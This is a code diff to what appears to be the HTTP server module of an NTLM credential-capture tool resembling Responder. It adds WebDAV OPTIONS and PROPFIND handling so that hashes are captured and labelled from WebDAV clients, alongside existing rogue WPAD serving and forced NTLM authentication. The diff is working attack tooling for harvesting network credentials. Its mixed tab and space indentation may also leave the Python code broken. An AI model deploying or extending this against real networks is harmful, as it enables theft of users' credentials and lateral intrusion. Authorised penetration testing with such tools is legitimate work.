@@ -20,7 +20,7 @@ from base64 import b64decode
 from utils import *
 
 from packets import NTLM_Challenge
-from packets import IIS_Auth_401_Ans, IIS_Auth_Granted, IIS_NTLM_Challenge_Ans, IIS_Basic_401_Ans
+from packets import IIS_Auth_401_Ans, IIS_Auth_Granted, IIS_NTLM_Challenge_Ans, IIS_Basic_401_Ans,WEBDAV_Options_Answer
 from packets import WPADScript, ServeExeFile, ServeHtmlFile
 
 
@@ -128,6 +128,21 @@ def WpadCustom(data, client):
 		return str(Buffer)
 	return False
 
+def IsWebDAV(data):
+        dav = re.search('PROPFIND', data)
+        if dav:
+              return True
+        else:
+              return False
+
+def ServeOPTIONS(data):
+	WebDav= re.search('OPTIONS', data)
+	if WebDav:
+		Buffer = WEBDAV_Options_Answer()
+		return str(Buffer)
+
+	return False
+
 def ServeFile(Filename):
 	with open (Filename, "rb") as bk:
 		return bk.read()
@@ -171,10 +186,12 @@ def PacketSequence(data, client):
 		return RespondWithFile(client, settings.Config.Html_Filename)
 
 	WPAD_Custom = WpadCustom(data, client)
-	
+        # Webdav
+        if ServeOPTIONS(data):
+                return ServeOPTIONS(data)
+
 	if NTLM_Auth:
 		Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]
-
 		if Packet_NTLM == "\x01":
 			GrabURL(data, client)
 			GrabReferer(data, client)
@@ -186,12 +203,15 @@ def PacketSequence(data, client):
 
 			Buffer_Ans = IIS_NTLM_Challenge_Ans()
 			Buffer_Ans.calculate(str(Buffer))
-
 			return str(Buffer_Ans)
 
 		if Packet_NTLM == "\x03":
 			NTLM_Auth = b64decode(''.join(NTLM_Auth))
-			ParseHTTPHash(NTLM_Auth, client, "HTTP")
+                        if IsWebDAV(data):
+                                 module = "WebDAV"
+                        else:
+                                 module = "HTTP"
+			ParseHTTPHash(NTLM_Auth, client, module)
 
 			if settings.Config.Force_WPAD_Auth and WPAD_Custom:
 				print text("[HTTP] WPAD (auth) file sent to %s" % client)
@@ -242,22 +262,24 @@ def PacketSequence(data, client):
 
 # HTTP Server class
 class HTTP(BaseRequestHandler):
+
 	def handle(self):
 		try:
-			self.request.settimeout(1)
-			data = self.request.recv(8092)
-			Buffer = WpadCustom(data, self.client_address[0])
+                	for x in range(2):   
+				self.request.settimeout(3)
+				data = self.request.recv(8092)
+				Buffer = WpadCustom(data, self.client_address[0])
 
-			if Buffer and settings.Config.Force_WPAD_Auth == False:
-				self.request.send(Buffer)
-				if settings.Config.Verbose:
-					print text("[HTTP] WPAD (no auth) file sent to %s" % self.client_address[0])
+				if Buffer and settings.Config.Force_WPAD_Auth == False:
+					self.request.send(Buffer)
+					if settings.Config.Verbose:
+						print text("[HTTP] WPAD (no auth) file sent to %s" % self.client_address[0])
 
-			else:
-				Buffer = PacketSequence(data,self.client_address[0])
-				self.request.send(Buffer)
+				else:
+					Buffer = PacketSequence(data,self.client_address[0])
+					self.request.send(Buffer)
 		except socket.error:
-			pass
+			raise
 
 # HTTPS Server class
 class HTTPS(StreamRequestHandler):
@@ -281,5 +303,5 @@ class HTTPS(StreamRequestHandler):
 				Buffer = PacketSequence(data,self.client_address[0])
 				self.exchange.send(Buffer)
 		except:
-			pass
+			raise
 
